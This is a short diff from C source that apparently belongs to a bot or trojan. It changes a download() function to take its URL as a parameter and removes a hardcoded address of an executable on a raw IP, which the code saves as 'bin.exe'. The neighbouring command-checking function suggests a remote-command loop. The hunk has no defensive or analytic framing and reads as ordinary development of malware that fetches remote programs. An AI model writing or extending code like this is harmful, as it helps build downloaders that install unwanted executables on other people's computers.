@@ -34,9 +34,8 @@ int iscommand(char buf)
 	}
 }
 
-int download()
+int download(char * url)
 {
-	char * url = "http://86.247.205.102/exe/url.exe";
 	char path[100] = "bin.exe";
 	int r = 1;
 	HMODULE hDll;
